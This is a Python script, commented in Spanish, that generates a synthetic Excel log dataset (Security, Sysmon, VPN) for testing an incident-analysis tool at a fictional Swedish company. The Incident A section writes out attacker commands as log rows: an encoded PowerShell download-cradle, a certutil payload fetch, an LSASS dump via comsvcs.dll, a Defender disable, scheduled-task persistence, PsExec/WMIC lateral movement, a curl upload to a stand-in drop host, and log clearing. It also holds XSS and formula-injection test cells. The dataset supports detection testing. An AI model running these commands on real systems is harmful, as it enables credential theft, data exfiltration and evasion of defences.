"""Generador del dataset SINTÉTICO de prueba para IncidentAnalyzer.

TODOS LOS DATOS SON FICTICIOS. Empresa ficticia "Fjordvik AB". Las IPs externas
pertenecen a rangos reservados de documentación (RFC 5737) y los dominios usan
el TLD reservado `.example` (RFC 2606).

Escenario:
  * Tráfico benigno de fondo (7 días, 2026-10-19 → 2026-10-25, Europe/Stockholm).
  * Incidente A (vie 23/10 madrugada): spraying + fuerza bruta VPN → acceso con
    m.lindqvist → ejecución, dump de credenciales, escalamiento, evasión,
    persistencia, movimiento lateral y exfiltración.
  * Incidente B (sáb 24/10): fuerza bruta fallida contra SRV-APP01 desde una IP
    externa distinta + logon interactivo de la cuenta de servicio svc_sql.
  * Filas inválidas y celdas maliciosas (inyección de fórmula / HTML) para probar
    validación y sanitización.

Uso:  python sample_data/generate_synthetic.py  [ruta_salida.xlsx]
"""
from __future__ import annotations

import base64
import hashlib
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path
from zoneinfo import ZoneInfo

from openpyxl import Workbook
from openpyxl.styles import Font

SEED = 20261102
TZ = ZoneInfo("Europe/Stockholm")
START = datetime(2026, 10, 19, tzinfo=TZ)  # lunes
DAYS = 7
DOMAIN = "FJORDVIK"

rnd = random.Random(SEED)

USERS = [
    "a.andersson", "b.berg", "c.carlsson", "d.dahl", "e.eriksson", "f.forsberg",
    "g.gustafsson", "h.hansson", "i.isaksson", "j.johansson", "k.nilsson", "l.larsson",
    "m.lindqvist", "n.nyberg", "o.olsson", "p.persson", "r.ringqvist", "s.svensson",
    "t.thorsen", "u.ulander", "v.vikstrom", "w.wallin", "y.ystrom", "z.zetterberg",
    "a.ahlgren", "b.bjork", "c.cederlund", "d.ek", "e.engstrom", "f.falk",
    "g.granlund", "h.holm", "j.jonsson", "k.karlsson", "l.lund", "m.magnusson",
]
ADMIN = "it.admin"
NEW_HIRE = "n.ekstrom"
ALL_HUMANS = USERS + [ADMIN]
# Estación primaria de cada usuario: WS-001 ... ; m.lindqvist → WS-017
HOST_OF = {}
_idx = 1
for _u in ALL_HUMANS:
    if _u == "m.lindqvist":
        continue
    if _idx == 17 or _idx == 31:
        _idx += 1
    HOST_OF[_u] = f"WS-{_idx:03d}"
    _idx += 1
HOST_OF["m.lindqvist"] = "WS-017"
HOST_OF["r.ringqvist"] = "WS-031"  # usuario dueño de WS-031 (Incidente B)
IP_OF_HOST = {h: f"10.10.1.{int(h[3:])}" for h in HOST_OF.values()}
SERVERS = {"SRV-DC01": "10.10.0.10", "SRV-FS01": "10.10.0.20", "SRV-SQL01": "10.10.0.30",
           "SRV-APP01": "10.10.0.40", "SRV-BKP01": "10.10.0.50"}
HOME_IP = {u: f"192.0.2.{10 + i}" for i, u in enumerate(ALL_HUMANS)}  # TEST-NET-1
HOME_IP["m.lindqvist"] = "192.0.2.17"
VPN_IP = {u: f"10.20.0.{10 + i}" for i, u in enumerate(ALL_HUMANS)}
VPN_USERS = ["k.nilsson", "m.lindqvist", "s.svensson", "e.eriksson", "t.thorsen", "h.holm"]

ATTACK_IP = "203.0.113.45"
ATTACK_VPN_IP = "10.20.0.57"
B_IP = "198.51.100.77"
STOCKHOLM = ("SE", "Stockholm", 59.3293, 18.0686)
SAO_PAULO = ("BR", "Sao Paulo", -23.5505, -46.6333)

BENIGN_PROCS = [
    (r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Windows\explorer.exe", '"chrome.exe" --profile-directory=Default'),
    (r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", r"C:\Windows\explorer.exe", '"OUTLOOK.EXE"'),
    (r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", r"C:\Windows\explorer.exe", '"EXCEL.EXE" /dde'),
    (r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", r"C:\Windows\explorer.exe", '"WINWORD.EXE" /n'),
    (r"C:\Users\{u}\AppData\Local\Microsoft\Teams\current\Teams.exe", r"C:\Windows\explorer.exe", '"Teams.exe" --system-initiated'),
    (r"C:\Windows\System32\notepad.exe", r"C:\Windows\explorer.exe", r'"notepad.exe" C:\Users\{u}\Documents\notas.txt'),
    (r"C:\Windows\System32\rundll32.exe", r"C:\Windows\explorer.exe", r'"rundll32.exe" shell32.dll,Control_RunDLL desk.cpl'),
    (r"C:\Program Files\Microsoft OneDrive\OneDrive.exe", r"C:\Windows\explorer.exe", '"OneDrive.exe" /background'),
    (r"C:\Windows\System32\cmd.exe", r"C:\Windows\explorer.exe", r'"cmd.exe" /c ipconfig /all'),
]

security_rows: list[dict] = []
sysmon_rows: list[dict] = []
vpn_rows: list[dict] = []


def sha256(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


def at(day: int, h: int, m: int, s: int = 0) -> datetime:
    d = START + timedelta(days=day)
    return datetime(d.year, d.month, d.day, h, m, s, tzinfo=TZ)


def jitter(dt: datetime, minutes: int) -> datetime:
    return dt + timedelta(seconds=rnd.randint(0, minutes * 60))


def sec(ts, event_id, host, account="", src_ip="", logon_type="", result="", target="",
        group="", privs="", share="", service="", msg=""):
    security_rows.append(dict(ts=ts, event_id=event_id, host=host, account=account, target=target,
                              src_ip=src_ip, logon_type=logon_type, result=result, group=group,
                              privs=privs, share=share, service=service, msg=msg))


def proc(ts, host, user, image, parent, cmd):
    sysmon_rows.append(dict(ts=ts, host=host, user=f"{DOMAIN}\\{user}", image=image, parent=parent,
                            cmd=cmd, sha=sha256(image.lower())))


def vpn(ts, user, ip, geo, status, assigned=""):
    vpn_rows.append(dict(ts=ts, user=user, ip=ip, country=geo[0], city=geo[1], lat=geo[2],
                         lon=geo[3], status=status, assigned=assigned))


# ---------------------------------------------------------------- tráfico benigno
for day in range(DAYS):
    weekday = (START + timedelta(days=day)).weekday()
    workday = weekday < 5
    # backups nocturnos (no interactivo, logon type 5) y servicio SQL
    sec(jitter(at(day, 1, 0), 5), 4624, "SRV-BKP01", "svc_backup", "-", 5, "Correcto",
        msg="Inicio de sesión de servicio")
    sec(jitter(at(day, 1, 45), 5), 4634, "SRV-BKP01", "svc_backup", "-", 5, "Correcto")
    sec(jitter(at(day, 6, 0), 3), 4624, "SRV-SQL01", "svc_sql", "-", 5, "Correcto",
        msg="Inicio de sesión de servicio")
    proc(jitter(at(day, 1, 2), 5), "SRV-BKP01", "svc_backup", r"C:\Program Files\Veeam\Backup\VeeamAgent.exe",
         r"C:\Windows\System32\services.exe", '"VeeamAgent.exe" -job Nightly')
    if not workday:
        # fin de semana: solo cuentas de servicio y tareas automáticas
        proc(jitter(at(day, 10, 0), 120), "SRV-APP01", "SYSTEM", r"C:\Windows\CCM\CcmExec.exe",
             r"C:\Windows\System32\services.exe", '"CcmExec.exe"')
        continue
    for u in ALL_HUMANS:
        host = HOST_OF[u]
        ip = IP_OF_HOST[host]
        login = jitter(at(day, 7, 30), 110)
        # error de tipeo ocasional: 1–2 fallos y luego éxito (no debe disparar fuerza bruta)
        if rnd.random() < 0.12:
            for k in range(rnd.randint(1, 2)):
                sec(login - timedelta(seconds=40 - k * 15), 4625, host, u, ip, 2, "Error",
                    msg="Contraseña incorrecta (0xC000006A)")
        sec(login, 4624, host, u, ip, 2, "Correcto", msg="Inicio de sesión interactivo")
        if u == ADMIN:
            sec(login + timedelta(seconds=1), 4672, host, u, ip, "", "Correcto",
                privs="SeDebugPrivilege; SeBackupPrivilege; SeTakeOwnershipPrivilege")
        # acceso a recursos de red del día
        for srv in ("SRV-FS01", "SRV-APP01"):
            t = login + timedelta(minutes=rnd.randint(5, 60))
            sec(t, 4624, srv, u, ip, 3, "Correcto", msg="Inicio de sesión de red")
            if srv == "SRV-FS01":
                sec(t + timedelta(seconds=2), 5140, srv, u, ip, "", "Correcto", share=r"\\*\Compartido")
        # procesos benignos
        for _ in range(rnd.randint(8, 14)):
            img, par, cmd = rnd.choice(BENIGN_PROCS)
            proc(login + timedelta(minutes=rnd.randint(1, 540)), host, u,
                 img.format(u=u), par, cmd.format(u=u))
        sec(login + timedelta(hours=8, minutes=rnd.randint(0, 90)), 4634, host, u, ip, 2, "Correcto")
    # administración IT legítima
    t = jitter(at(day, 9, 0), 60)
    sec(t, 4624, "SRV-APP01", ADMIN, IP_OF_HOST[HOST_OF[ADMIN]], 10, "Correcto", msg="RDP administración")
    sec(t + timedelta(seconds=1), 4672, "SRV-APP01", ADMIN, IP_OF_HOST[HOST_OF[ADMIN]], "", "Correcto",
        privs="SeDebugPrivilege; SeBackupPrivilege")
    proc(t + timedelta(minutes=3), HOST_OF[ADMIN], ADMIN, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         r"C:\Windows\explorer.exe", r'powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\inventario.ps1')
    proc(t + timedelta(minutes=20), HOST_OF[ADMIN], ADMIN, r"C:\Windows\System32\curl.exe",
         r"C:\Windows\System32\cmd.exe", "curl.exe -s https://intranet.fjordvik.example/health")
    proc(jitter(at(day, 10, 0), 120), "SRV-APP01", "SYSTEM", r"C:\Windows\CCM\CcmExec.exe",
         r"C:\Windows\System32\services.exe", '"CcmExec.exe"')
    # VPN de teletrabajo desde Suecia
    for u in VPN_USERS:
        if day == 0 or rnd.random() < 0.6:  # todos conectan el lunes (línea base)
            t = jitter(at(day, 8, 0), 120)
            vpn(t, u, HOME_IP[u], STOCKHOLM, "success", VPN_IP[u])

# alta legítima de un empleado nuevo (miércoles) en un grupo NO privilegiado
t = at(2, 10, 15)
sec(t, 4720, "SRV-DC01", ADMIN, IP_OF_HOST[HOST_OF[ADMIN]], "", "Correcto", target=NEW_HIRE,
    msg="Se creó una cuenta de usuario")
sec(t + timedelta(minutes=1), 4728, "SRV-DC01", ADMIN, IP_OF_HOST[HOST_OF[ADMIN]], "", "Correcto",
    target=NEW_HIRE, group="GG_Finanzas_Lectura", msg="Miembro agregado a grupo global")
HOST_OF[NEW_HIRE] = "WS-040"
IP_OF_HOST["WS-040"] = "10.10.1.40"
for day in (3, 4):
    t = jitter(at(day, 8, 0), 30)
    sec(t, 4624, "WS-040", NEW_HIRE, "10.10.1.40", 2, "Correcto")
    proc(t + timedelta(minutes=5), "WS-040", NEW_HIRE, *BENIGN_PROCS[1])

# teletrabajo tardío legítimo (martes 21:30) → fuera de horario, probable falso positivo
vpn(at(1, 21, 30), "k.nilsson", HOME_IP["k.nilsson"], STOCKHOLM, "success", VPN_IP["k.nilsson"])
# m.lindqvist trabaja tarde desde casa el jueves (referencia para viaje imposible)
vpn(at(3, 22, 40), "m.lindqvist", HOME_IP["m.lindqvist"], STOCKHOLM, "success", VPN_IP["m.lindqvist"])

# ---------------------------------------------------------------- Incidente A (viernes, día 4)
D = 4
# 1) password spraying VPN
sprayed = rnd.sample([u for u in USERS if u != "m.lindqvist"], 25)
t = at(D, 2, 5)
for u in sprayed:
    for _ in range(rnd.randint(1, 2)):
        vpn(t, u, ATTACK_IP, SAO_PAULO, "failure")
        t += timedelta(seconds=rnd.randint(10, 25))
# 2) fuerza bruta contra m.lindqvist
t = at(D, 2, 22)
for _ in range(18):
    vpn(t, "m.lindqvist", ATTACK_IP, SAO_PAULO, "failure")
    t += timedelta(seconds=rnd.randint(30, 55))
# 3) acceso exitoso
vpn(at(D, 2, 41), "m.lindqvist", ATTACK_IP, SAO_PAULO, "success", ATTACK_VPN_IP)
sec(at(D, 2, 47), 4624, "WS-017", "m.lindqvist", ATTACK_VPN_IP, 10, "Correcto",
    msg="Inicio de sesión RemoteInteractive (RDP)")
# 4) ejecución
payload = "IEX (New-Object Net.WebClient).DownloadString('http://cdn-update.example/a.ps1')"
enc = base64.b64encode(payload.encode("utf-16-le")).decode()
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
proc(at(D, 2, 49), "WS-017", "m.lindqvist", PS, r"C:\Windows\explorer.exe",
     f"powershell.exe -NoP -W Hidden -Enc {enc}")
proc(at(D, 2, 51), "WS-017", "m.lindqvist", r"C:\Windows\System32\certutil.exe", PS,
     r"certutil.exe -urlcache -split -f http://cdn-update.example/svc.exe C:\Users\Public\svc.exe")
MAL_HASH = sha256("svc.exe-malicious-sample")
sysmon_rows.append(dict(ts=at(D, 2, 52), host="WS-017", user=f"{DOMAIN}\\m.lindqvist",
                        image=r"C:\Users\Public\svc.exe", parent=PS, cmd=r"C:\Users\Public\svc.exe -k netsvc",
                        sha=MAL_HASH))
# 5) acceso a credenciales
proc(at(D, 2, 55), "WS-017", "m.lindqvist", r"C:\Windows\System32\rundll32.exe", PS,
     r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\lsass.dmp full")
# 6) escalamiento
sec(at(D, 3, 2), 4732, "WS-017", "m.lindqvist", "", "", "Correcto", target="m.lindqvist",
    group="Administrators", msg="Miembro agregado a grupo local con seguridad habilitada")
sec(at(D, 3, 3), 4672, "WS-017", "m.lindqvist", "", "", "Correcto",
    privs="SeDebugPrivilege; SeImpersonatePrivilege; SeTcbPrivilege")
# 7) evasión y persistencia
proc(at(D, 3, 5), "WS-017", "m.lindqvist", PS, r"C:\Windows\System32\cmd.exe",
     "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")
proc(at(D, 3, 8), "WS-017", "m.lindqvist", r"C:\Windows\System32\schtasks.exe", r"C:\Windows\System32\cmd.exe",
     r'schtasks /create /tn "WindowsUpdateCheck" /tr C:\Users\Public\svc.exe /sc onlogon /ru SYSTEM')
sec(at(D, 3, 10), 4728, "SRV-DC01", "m.lindqvist", IP_OF_HOST["WS-017"], "", "Correcto",
    target="m.lindqvist", group="Domain Admins", msg="Miembro agregado a grupo global con seguridad habilitada")
# 8) movimiento lateral
for i, srv in enumerate(("SRV-FS01", "SRV-SQL01", "SRV-DC01")):
    tt = at(D, 3, 12 + i * 5)
    sec(tt, 4624, srv, "m.lindqvist", IP_OF_HOST["WS-017"], 3, "Correcto", msg="Inicio de sesión de red")
    sec(tt + timedelta(seconds=1), 4672, srv, "m.lindqvist", IP_OF_HOST["WS-017"], "", "Correcto",
        privs="SeDebugPrivilege; SeBackupPrivilege")
    if srv != "SRV-DC01":
        sec(tt + timedelta(seconds=3), 5140, srv, "m.lindqvist", IP_OF_HOST["WS-017"], "", "Correcto",
            share=r"\\*\ADMIN$")
proc(at(D, 3, 16), "WS-017", "m.lindqvist", r"C:\Users\Public\PsExec.exe", r"C:\Windows\System32\cmd.exe",
     r"PsExec.exe \\SRV-SQL01 -accepteula -s cmd.exe")
sec(at(D, 3, 17), 7045, "SRV-SQL01", "SYSTEM", "", "", "Correcto", service="PSEXESVC",
    msg=r"Se instaló un servicio: PSEXESVC (%SystemRoot%\PSEXESVC.exe)")
proc(at(D, 3, 19), "WS-017", "m.lindqvist", r"C:\Windows\System32\wbem\WMIC.exe", r"C:\Windows\System32\cmd.exe",
     r'wmic /node:SRV-FS01 process call create "cmd.exe /c whoami > C:\Users\Public\w.txt"')
# 9) recolección y exfiltración
proc(at(D, 3, 30), "SRV-FS01", "m.lindqvist", r"C:\Program Files\7-Zip\7z.exe", r"C:\Windows\System32\cmd.exe",
     r"7z.exe a -pInfierno2026 C:\Users\Public\fs.7z \\SRV-FS01\Finanzas")
proc(at(D, 3, 34), "SRV-FS01", "m.lindqvist", r"C:\Windows\System32\curl.exe", r"C:\Windows\System32\cmd.exe",
     r"curl.exe -T C:\Users\Public\fs.7z https://files.transfer-drop.example/upload")
# 10) borrado de logs
proc(at(D, 3, 38), "WS-017", "m.lindqvist", r"C:\Windows\System32\wevtutil.exe", r"C:\Windows\System32\cmd.exe",
     "wevtutil cl Security")
sec(at(D, 3, 38, 20), 1102, "WS-017", "m.lindqvist", "", "", "Correcto", msg="Se borró el registro de auditoría")
# 11) sesiones simultáneas / viaje imposible a la mañana
vpn(at(D, 7, 58), "m.lindqvist", ATTACK_IP, SAO_PAULO, "success", ATTACK_VPN_IP)
vpn(at(D, 8, 1), "m.lindqvist", HOME_IP["m.lindqvist"], STOCKHOLM, "success", VPN_IP["m.lindqvist"])

# ---------------------------------------------------------------- Incidente B (sábado, día 5)
D = 5
t = at(D, 14, 0)
for i in range(55):
    target = "svc_sql" if i % 2 == 0 else "administrator"
    sec(t, 4625, "SRV-APP01", target, B_IP, 3, "Error", msg="Error de inicio de sesión (0xC000006A)")
    t += timedelta(seconds=rnd.randint(15, 30))
sec(at(D, 16, 40), 4624, "SRV-APP01", "svc_sql", IP_OF_HOST["WS-031"], 10, "Correcto",
    msg="Inicio de sesión RemoteInteractive (RDP)")

# ---------------------------------------------------------------- escritura del Excel
security_rows.sort(key=lambda r: r["ts"])
sysmon_rows.sort(key=lambda r: r["ts"])
vpn_rows.sort(key=lambda r: r["ts"])


def build(path: Path) -> None:
    wb = Workbook()
    ws = wb.active
    ws.title = "LEEME_SINTETICO"
    lines = [
        "DATASET SINTÉTICO — NO CONTIENE DATOS REALES",
        "Generado por sample_data/generate_synthetic.py (semilla fija) para desarrollo y pruebas.",
        "Empresa, usuarios, hosts, IPs (RFC 5737) y dominios (.example) son ficticios.",
        "Hojas: Security (eventos Windows, hora local Estocolmo en texto dd/mm/aaaa),",
        "Sysmon_Procesos (fecha nativa de Excel, hora local), VPN (ISO-8601 en UTC con 'Z').",
    ]
    for i, line in enumerate(lines, 1):
        ws.cell(row=i, column=1, value=line)
    ws["A1"].font = Font(bold=True, color="C00000")

    s = wb.create_sheet("Security")
    s.append(["Fecha/Hora", "EventID", "Equipo", "Cuenta", "Cuenta destino", "IP Origen",
              "Tipo de inicio de sesión", "Resultado", "Grupo", "Privilegios",
              "Nombre de recurso compartido", "Nombre de servicio", "Mensaje"])
    for r in security_rows:
        s.append([r["ts"].strftime("%d/%m/%Y %H:%M:%S"), r["event_id"], r["host"], r["account"], r["target"],
                  r["src_ip"], r["logon_type"], r["result"], r["group"], r["privs"], r["share"],
                  r["service"], r["msg"]])
    # filas inválidas (deben reportarse, no descartarse en silencio)
    for bad in ("N/D", "", "32/13/2026 25:61:00", "ayer", "", "2026-13-45", "--", "sin fecha"):
        s.append([bad, 4624, "WS-005", "e.eriksson", "", "10.10.1.5", 2, "Correcto", "", "", "", "",
                  "Fila con marca de tiempo inválida (prueba de validación)"])
    s.append([at(2, 12, 0).strftime("%d/%m/%Y %H:%M:%S"), 4624, "WS-002", "b.berg", "", "10.10.1.2", 2,
              "Correcto", "", "", "", "", "<script>alert('xss')</script>"])

    p = wb.create_sheet("Sysmon_Procesos")
    p.append(["TimeCreated", "Computer", "User", "Image", "ParentImage", "CommandLine", "SHA256"])
    for r in sysmon_rows:
        p.append([r["ts"].replace(tzinfo=None), r["host"], r["user"], r["image"], r["parent"], r["cmd"], r["sha"]])
        p.cell(row=p.max_row, column=1).number_format = "yyyy-mm-dd hh:mm:ss"
    p.append([None, "WS-009", f"{DOMAIN}\\i.isaksson", r"C:\Windows\System32\notepad.exe",
              r"C:\Windows\explorer.exe", "notepad.exe", sha256("notepad")])
    p.append([at(1, 11, 11).replace(tzinfo=None), "WS-003", f"{DOMAIN}\\c.carlsson",
              r"C:\Windows\System32\cmd.exe", r"C:\Windows\explorer.exe", None, sha256("cmd")])
    c = p.cell(row=p.max_row, column=6)
    c.value = '=HYPERLINK("http://phish.example","clic aquí")'
    c.data_type = "s"  # se guarda como texto, no como fórmula
    p.cell(row=p.max_row, column=1).number_format = "yyyy-mm-dd hh:mm:ss"

    v = wb.create_sheet("VPN")
    v.append(["timestamp", "username", "src_ip", "country", "city", "latitude", "longitude", "status",
              "assigned_ip"])
    for r in vpn_rows:
        v.append([r["ts"].astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"), r["user"], r["ip"],
                  r["country"], r["city"], r["lat"], r["lon"], r["status"], r["assigned"]])

    for sheet in (s, p, v):
        for cell in sheet[1]:
            cell.font = Font(bold=True)
    wb.save(path)


if __name__ == "__main__":
    out = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).with_name("SINTETICO_logs_cliente.xlsx")
    build(out)
    print(f"OK {out} | Security={len(security_rows)} Sysmon={len(sysmon_rows)} VPN={len(vpn_rows)}")
